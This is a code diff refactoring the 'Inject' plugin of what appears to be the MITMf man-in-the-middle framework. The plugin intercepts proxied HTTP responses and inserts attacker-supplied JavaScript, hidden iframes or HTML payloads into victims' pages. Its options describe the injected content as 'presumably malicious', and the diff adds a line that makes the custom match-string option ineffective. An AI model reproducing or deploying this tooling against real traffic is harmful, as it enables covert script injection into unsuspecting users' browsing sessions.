@@ -27,22 +27,21 @@ import argparse
 from core.utils import SystemConfig
 from plugins.plugin import Plugin
 from plugins.CacheKill import CacheKill
+from core.sergioproxy.ProxyPlugins import ProxyPlugins
 
 mitmf_logger = logging.getLogger("mitmf")
 
-class Inject(CacheKill, Plugin):
+class Inject(Plugin):
     name       = "Inject"
     optname    = "inject"
-    implements = ["handleResponse", "handleHeader", "connectionMade"]
-    has_opts   = True
     desc       = "Inject arbitrary content into HTML content"
     version    = "0.2"
-    depends    = ["CacheKill"]
+    has_opts   = True
 
     def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options      = options
-        self.proxyip      = SystemConfig.getIP(options.interface)
+        self.our_ip       = SystemConfig.getIP(options.interface)
         self.html_src     = options.html_url
         self.js_src       = options.js_url
         self.rate_limit   = options.rate_limit
@@ -50,35 +49,32 @@ class Inject(CacheKill, Plugin):
         self.per_domain   = options.per_domain
         self.black_ips    = options.black_ips
         self.white_ips    = options.white_ips
-        self.match_str    = options.match_str
+        self.match_str    = "</body>" or options.match_str
         self.html_payload = options.html_payload
+        self.ctable       = {}
+        self.dtable       = {}
+        self.count        = 0
+        self.mime         = "text/html"
 
-        if self.options.preserve_cache:
-            self.implements.remove("handleHeader")
-            self.implements.remove("connectionMade")
+        if not options.preserve_cache:
+            cachekill = CacheKill()
+            cachekill.initialize(options)
+            ProxyPlugins.getInstance().addPlugin(cachekill)
 
-        if options.html_file is not None:
-            self.html_payload += options.html_file.read()
-
-        self.ctable = {}
-        self.dtable = {}
-        self.count = 0
-        self.mime = "text/html"
-
-    def handleResponse(self, request, data):
+    def serverResponse(self, response, request, data):
         #We throttle to only inject once every two seconds per client
         #If you have MSF on another host, you may need to check prior to injection
-        #print "http://" + request.client.getRequestHostname() + request.uri
-        ip, hn, mime = self._get_req_info(request)
-        if self._should_inject(ip, hn, mime) and self._ip_filter(ip) and (hn not in self.proxyip):
+        #print "http://" + response.client.getRequestHostname() + response.uri
+        ip, hn, mime = self._get_req_info(response)
+        if self._should_inject(ip, hn, mime) and self._ip_filter(ip) and (hn not in self.our_ip):
             if (not self.js_src == self.html_src is not None or not self.html_payload == ""):
                 data = self._insert_html(data, post=[(self.match_str, self._get_payload())])
                 self.ctable[ip] = time.time()
                 self.dtable[ip+hn] = True
                 self.count += 1
-                mitmf_logger.info("%s [%s] Injected malicious html" % (ip, hn))
-        
-        return {'request': request, 'data': data}
+                mitmf_logger.info("{} [{}] Injected malicious html: {}".format(ip, self.name, hn))
+
+        return {'response': response, 'request':request, 'data': data}
 
     def _get_payload(self):
         return self._get_js() + self._get_iframe() + self.html_payload
@@ -116,10 +112,10 @@ class Inject(CacheKill, Plugin):
 
         return mime.find(self.mime) != -1
 
-    def _get_req_info(self, request):
-        ip = request.client.getClientIP()
-        hn = request.client.getRequestHostname()
-        mime = request.client.headers['Content-Type']
+    def _get_req_info(self, response):
+        ip = response.getClientIP()
+        hn = response.getRequestHostname()
+        mime = response.headers['Content-Type']
         return (ip, hn, mime)
 
     def _get_iframe(self):
@@ -154,12 +150,11 @@ class Inject(CacheKill, Plugin):
 
         return data
 
-    def add_options(self, options):
+    def pluginOptions(self, options):
         options.add_argument("--js-url", type=str, help="Location of your (presumably) malicious Javascript.")
         options.add_argument("--html-url", type=str, help="Location of your (presumably) malicious HTML. Injected via hidden iframe.")
-        options.add_argument("--html-payload", type=str, default="", help="String you would like to inject.")
-        options.add_argument("--html-file", type=argparse.FileType('r'), default=None, help="File containing code you would like to inject.")
-        options.add_argument("--match-str", type=str, default="</body>", help="String you would like to match and place your payload before. (</body> by default)")
+        options.add_argument("--html-payload", type=str, default=None, help="String you would like to inject.")
+        options.add_argument("--match-str", type=str, default=None, help="String you would like to match and place your payload before. (</body> by default)")
         options.add_argument("--preserve-cache", action="store_true", help="Don't kill the server/client caching.")
         group = options.add_mutually_exclusive_group(required=False)
         group.add_argument("--per-domain", action="store_true", default=False, help="Inject once per domain per client.")
